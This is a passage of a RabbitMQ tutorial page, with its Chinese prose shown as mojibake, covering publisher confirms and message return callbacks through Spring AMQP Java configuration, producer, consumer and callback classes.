/></p></li></ol><p>â€‹ç¬¬äºŒä¸ªæ¶ˆæ¯è¢«å…ˆæ¶ˆè´¹æ‰äº†ï¼Œç¬¦åˆé¢„æœŸ</p><blockquote><p>æ€»ç»“</p></blockquote><ol><li>å»¶æ—¶é˜Ÿåˆ—åœ¨éœ€è¦å»¶æ—¶å¤„ç†çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ï¼Œä½¿ç”¨RabbitMQæ¥å®ç°å»¶æ—¶é˜Ÿåˆ—å¯ä»¥å¾ˆå¥½çš„åˆ©ç”¨<br />RabbitMQ.çš„ç‰¹æ€§ï¼Œå¦‚:æ¶ˆæ¯å¯é å‘é€ã€æ¶ˆæ¯å¯é æŠ•é€’ã€æ­»ä¿¡é˜Ÿåˆ—æ¥ä¿éšœæ¶ˆæ¯è‡³å°‘è¢«æ¶ˆè´¹ä¸€æ¬¡ä»¥åŠæœªè¢«æ­£ç¡®å¤„ç†çš„æ¶ˆæ¯ä¸ä¼šè¢«ä¸¢å¼ƒã€‚å¦å¤–ï¼Œé€šè¿‡RabbitMQé›†ç¾¤çš„ç‰¹æ€§ï¼Œå¯ä»¥å¾ˆå¥½çš„è§£å†³å•ç‚¹æ•…éšœé—®é¢˜ï¼Œä¸ä¼šå› ä¸ºå•ä¸ªèŠ‚ç‚¹æŒ‚æ‰å¯¼è‡´å»¶æ—¶é˜Ÿåˆ—ä¸å¯ç”¨æˆ–è€…æ¶ˆæ¯ä¸¢å¤±ã€‚</li><li>å½“ç„¶ï¼Œå»¶æ—¶é˜Ÿåˆ—è¿˜æœ‰å¾ˆå¤šå…¶å®ƒé€‰æ‹©ï¼Œæ¯”å¦‚åˆ©ç”¨Javaçš„DelayQueueï¼Œåˆ©ç”¨Redis.çš„zssetï¼Œåˆ©ç”¨Quartzæˆ–è€…åˆ©ç”¨kafkaçš„æ—¶é—´è½®ï¼Œè¿™äº›æ–¹å¼å„æœ‰ç‰¹ç‚¹,çœ‹éœ€è¦é€‚ç”¨çš„åœºæ™¯</li></ol><h1 id="9-å‘å¸ƒç¡®è®¤é«˜çº§"><a class="markdownIt-Anchor" href="#9-å‘å¸ƒç¡®è®¤é«˜çº§"></a> 9. å‘å¸ƒç¡®è®¤é«˜çº§</h1><blockquote><p>ä»‹ç»</p></blockquote><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”±äºä¸€äº›ä¸æ˜åŸå› ï¼Œå¯¼è‡´ rabbitmqé‡å¯ï¼Œåœ¨RabbitMQé‡å¯æœŸé—´ç”Ÿäº§è€…æ¶ˆæ¯æŠ•é€’å¤±è´¥,å¯¼è‡´æ¶ˆæ¯ä¸¢å¤±ï¼Œéœ€è¦æ‰‹åŠ¨å¤„ç†å’Œæ¢å¤ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å¼€å§‹æ€è€ƒï¼Œå¦‚ä½•æ‰èƒ½è¿›è¡ŒRabbitMQçš„æ¶ˆæ¯å¯é æŠ•é€’å‘¢?ç‰¹åˆ«æ˜¯åœ¨è¿™æ ·æ¯”è¾ƒæç«¯çš„æƒ…å†µï¼ŒRabbitMQé›†ç¾¤ä¸å¯ç”¨çš„æ—¶å€™ï¼Œæ— æ³•æŠ•é€’çš„æ¶ˆæ¯è¯¥å¦‚ä½•å¤„ç†å‘¢ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113144153062.png" alt="image-20230113144153062" /></p><blockquote><p>å®ç°</p></blockquote><ol><li><p>é…ç½®æ–‡ä»¶ï¼šæ·»åŠ </p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.publisher-confirm-type</span> = <span class="hljs-string">correlated</span><br></code></pre></td></tr></table></figure></li><li><p>é…ç½®ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * é…ç½®ç±»ï¼šå‘å¸ƒç¡®è®¤ï¼ˆé«˜çº§ï¼‰</span><br><span class="hljs-comment"> * [io.xtwoy.config]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:46]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfirmConfig</span> &#123;<br><br>    <span class="hljs-comment">//äº¤æ¢æœº</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_exchange&quot;</span>;<br>    <span class="hljs-comment">//é˜Ÿåˆ—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_queue&quot;</span>;<br>    <span class="hljs-comment">//RoutingKey</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_routing_key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;key1&quot;</span>;<br><br>    <span class="hljs-comment">//å£°æ˜äº¤æ¢æœº</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">confirmExchange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(CONFIRM_EXCHANGE_NAME);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">confirmQueue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(CONFIRM_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBindingExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;confirmQueue&quot;)</span> Queue confirmQueue,</span><br><span class="hljs-params">                                        <span class="hljs-meta">@Qualifier(&quot;confirmExchange&quot;)</span> DirectExchange confirmExchange)</span> &#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(confirmQueue).to(confirmExchange).with(CONFIRM_routing_key);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å¼€å§‹å‘æ¶ˆæ¯ æµ‹è¯•ç¡®è®¤</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RequestMapping(&quot;/confirm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//å‘æ¶ˆæ¯</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                ,ConfirmConfig.CONFIRM_routing_key<br>                ,message);<br>        log.info(<span class="hljs-string">&quot;å‘é€æ¶ˆæ¯å†…å®¹ï¼š&#123;&#125;&quot;</span>,message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.consumer;<br><br><span class="hljs-keyword">import</span> io.xtwoy.config.ConfirmConfig;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å‘å¸ƒç¡®è®¤ æ¶ˆè´¹è€…</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:50]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfirmConsumer</span> &#123;<br><br>    <span class="hljs-meta">@RabbitListener(queues = ConfirmConfig.CONFIRM_QUEUE_NAME)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receiveConfirmMessage</span><span class="hljs-params">(Message message)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.info(<span class="hljs-string">&quot;æ¥å—åˆ°çš„é˜Ÿåˆ—confirm.queueæ¶ˆæ¯ï¼š&#123;&#125;&quot;</span>,msg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>å›è°ƒæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallBack</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.ConfirmCallback &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//æ³¨å…¥</span><br>        rabbitTemplate.setConfirmCallback(<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * äº¤æ¢æœºç¡®è®¤å›è°ƒæ–¹æ³•,å‘æ¶ˆæ¯åï¼Œäº¤æ¢æœºæ¥æ”¶åˆ°äº†å°±å›è°ƒ</span><br><span class="hljs-comment">    *   1.1 correlationDataï¼šä¿å­˜å›è°ƒæ¶ˆæ¯çš„IDåŠç›¸å…³ä¿¡æ¯</span><br><span class="hljs-comment">    *   1.2 b:äº¤æ¢æœºæ”¶åˆ°æ¶ˆæ¯ï¼Œä¸ºtrue</span><br><span class="hljs-comment">    *   1.3 s:å¤±è´¥åŸå› ï¼ŒæˆåŠŸä¸ºnull</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * å‘æ¶ˆæ¯ï¼Œäº¤æ¢æœºæ¥å—å¤±è´¥ï¼Œä¹Ÿå›è°ƒ</span><br><span class="hljs-comment">    *   2.1 correlationDataï¼šä¿å­˜å›è°ƒæ¶ˆæ¯çš„IDåŠç›¸å…³ä¿¡æ¯</span><br><span class="hljs-comment">    *   2.2 b:äº¤æ¢æœºæ²¡æ”¶åˆ°æ¶ˆæ¯ï¼Œä¸ºfalse</span><br><span class="hljs-comment">    *   2.3 s:å¤±è´¥çš„åŸå› </span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">     * */</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">confirm</span><span class="hljs-params">(CorrelationData correlationData, <span class="hljs-type">boolean</span> b, String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> correlationData!=<span class="hljs-literal">null</span> ? correlationData.getId():<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (b)&#123;<br>            log.info(<span class="hljs-string">&quot;äº¤æ¢æœºå·²ç»æ”¶åˆ°IDä¸ºï¼š&#123;&#125;çš„ä¿¡æ¯&quot;</span>,id);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            log.info(<span class="hljs-string">&quot;äº¤æ¢æœºè¿˜æœªæ”¶åˆ°IDä¸ºï¼š&#123;&#125;çš„æ¶ˆæ¯ï¼Œç”±äºåŸå› ï¼š&#123;&#125;&quot;</span>,id,s);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>é…ç½®æ–‡ä»¶åŠæ¶ˆæ¯å‘é€æ–¹</p><table><thead><tr><th>å€¼</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>NONE</td><td>ç¦ç”¨å‘å¸ƒç¡®è®¤æ¨¡å¼ï¼Œæ˜¯é»˜è®¤å€¼</td></tr><tr><td>CORRELATED</td><td>å‘å¸ƒæ¶ˆæ¯æˆåŠŸåˆ°äº¤æ¢å™¨åä¼šè§¦å‘å›è°ƒæ–¹æ³•</td></tr><tr><td>SIMPLE</td><td>ç»æµ‹è¯•æœ‰ä¸¤ç§æ•ˆæœï¼Œå…¶ä¸€æ•ˆæœå’Œ CORRELATED å€¼ä¸€æ ·ä¼šè§¦å‘å›è°ƒæ–¹æ³•ï¼Œå…¶äºŒåœ¨å‘å¸ƒæ¶ˆæ¯æˆåŠŸåä½¿ç”¨ rabbitTemplate è°ƒç”¨ waitForConfirms æˆ– waitForConfirmsOrDie æ–¹æ³•</td></tr></tbody></table><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.publisher-confirm-type</span> = <span class="hljs-string">correlated</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RequestMapping(&quot;/confirm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//å‘æ¶ˆæ¯</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span> &#123;<br><br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                , ConfirmConfig.CONFIRM_routing_key<br>                , message<br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(UUID.randomUUID().toString()));<br><br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                , ConfirmConfig.CONFIRM_routing_key1<br>                , message<br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(UUID.randomUUID().toString()));<br><br>        log.info(<span class="hljs-string">&quot;å‘é€æ¶ˆæ¯å†…å®¹ï¼š&#123;&#125;&quot;</span>, message);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><strong>ç»“æœåˆ†æ</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113151159399.png" alt="image-20230113151159399" /></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå‘é€äº†ä¸¤æ¡æ¶ˆæ¯ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯çš„ RoutingKey ä¸º â€œkey1â€ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯çš„ RoutingKey ä¸º&quot;key2&quot;ï¼Œä¸¤æ¡æ¶ˆæ¯éƒ½æˆåŠŸè¢«äº¤æ¢æœºæ¥æ”¶ï¼Œä¹Ÿæ”¶åˆ°äº†äº¤æ¢æœºçš„ç¡®è®¤å›è°ƒï¼Œä½†æ¶ˆè´¹è€…åªæ”¶åˆ°äº†ä¸€æ¡æ¶ˆæ¯ï¼Œå› ä¸ºç¬¬äºŒæ¡æ¶ˆæ¯çš„ RoutingKey ä¸é˜Ÿåˆ—çš„ BindingKey ä¸ä¸€è‡´ï¼Œä¹Ÿæ²¡æœ‰å…¶å®ƒé˜Ÿåˆ—èƒ½æ¥æ”¶è¿™ä¸ªæ¶ˆæ¯ï¼Œæ‰€æœ‰ç¬¬äºŒæ¡æ¶ˆæ¯è¢«ç›´æ¥ä¸¢å¼ƒäº†ã€‚</p></li></ol><p>â€‹</p><h2 id="91-å›é€€æ¶ˆæ¯"><a class="markdownIt-Anchor" href="#91-å›é€€æ¶ˆæ¯"></a> 9.1 å›é€€æ¶ˆæ¯</h2><p><strong>Mandatory å‚æ•°</strong></p><p><strong>åœ¨ä»…å¼€å¯äº†ç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œäº¤æ¢æœºæ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œä¼šç›´æ¥ç»™æ¶ˆæ¯ç”Ÿäº§è€…å‘é€ç¡®è®¤æ¶ˆæ¯ï¼Œå¦‚æœå‘ç°è¯¥æ¶ˆæ¯ä¸å¯è·¯ç”±ï¼Œé‚£ä¹ˆæ¶ˆæ¯ä¼šè¢«ç›´æ¥ä¸¢å¼ƒï¼Œæ­¤æ—¶ç”Ÿäº§è€…æ˜¯ä¸çŸ¥é“æ¶ˆæ¯è¢«ä¸¢å¼ƒè¿™ä¸ªäº‹ä»¶çš„</strong>ã€‚é‚£ä¹ˆå¦‚ä½•è®©æ— æ³•è¢«è·¯ç”±çš„æ¶ˆæ¯å¸®æˆ‘æƒ³åŠæ³•å¤„ç†ä¸€ä¸‹ï¼Ÿæœ€èµ·ç é€šçŸ¥æˆ‘ä¸€å£°ï¼Œæˆ‘å¥½è‡ªå·±å¤„ç†å•Šã€‚é€šè¿‡è®¾ç½® <code>mandatory</code> å‚æ•°å¯ä»¥åœ¨å½“æ¶ˆæ¯ä¼ é€’è¿‡ç¨‹ä¸­ä¸å¯è¾¾ç›®çš„åœ°æ—¶å°†æ¶ˆæ¯è¿”å›ç»™ç”Ÿäº§è€…ã€‚</p><ol><li><p>é…ç½®æ–‡ä»¶</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.publisher-returns</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure></li><li><p>å›é€€æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config.callback;<br><br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.connection.CorrelationData;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> javax.annotation.PostConstruct;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ¶ˆæ¯å›è°ƒ</span><br><span class="hljs-comment"> * [io.xtwoy.config.callback]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:53]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallBack</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.ConfirmCallback,RabbitTemplate.ReturnCallback &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//æ³¨å…¥</span><br>        rabbitTemplate.setConfirmCallback(<span class="hljs-built_in">this</span>);<br>        rabbitTemplate.setReturnCallback(<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * äº¤æ¢æœºç¡®è®¤å›è°ƒæ–¹æ³•,å‘æ¶ˆæ¯åï¼Œäº¤æ¢æœºæ¥æ”¶åˆ°äº†å°±å›è°ƒ</span><br><span class="hljs-comment">     *   1.1 correlationDataï¼šä¿å­˜å›è°ƒæ¶ˆæ¯çš„IDåŠç›¸å…³ä¿¡æ¯</span><br><span class="hljs-comment">     *   1.2 b:äº¤æ¢æœºæ”¶åˆ°æ¶ˆæ¯ï¼Œä¸ºtrue</span><br><span class="hljs-comment">     *   1.3 s:å¤±è´¥åŸå› ï¼ŒæˆåŠŸä¸ºnull</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * å‘æ¶ˆæ¯ï¼Œäº¤æ¢æœºæ¥å—å¤±è´¥ï¼Œä¹Ÿå›è°ƒ</span><br><span class="hljs-comment">     *   2.1 correlationDataï¼šä¿å­˜å›è°ƒæ¶ˆæ¯çš„IDåŠç›¸å…³ä¿¡æ¯</span><br><span class="hljs-comment">     *   2.2 b:äº¤æ¢æœºæ²¡æ”¶åˆ°æ¶ˆæ¯ï¼Œä¸ºfalse</span><br><span class="hljs-comment">     *   2.3 s:å¤±è´¥çš„åŸå› </span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * */</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">confirm</span><span class="hljs-params">(CorrelationData correlationData, <span class="hljs-type">boolean</span> b, String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> correlationData!=<span class="hljs-literal">null</span> ? correlationData.getId():<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (b)&#123;<br>            log.info(<span class="hljs-string">&quot;äº¤æ¢æœºå·²ç»æ”¶åˆ°IDä¸ºï¼š&#123;&#125;çš„ä¿¡æ¯&quot;</span>,id);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            log.info(<span class="hljs-string">&quot;äº¤æ¢æœºè¿˜æœªæ”¶åˆ°IDä¸ºï¼š&#123;&#125;çš„æ¶ˆæ¯ï¼Œç”±äºåŸå› ï¼š&#123;&#125;&quot;</span>,id,s);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//å¯ä»¥åœ¨å½“æ¶ˆæ¯ä¼ 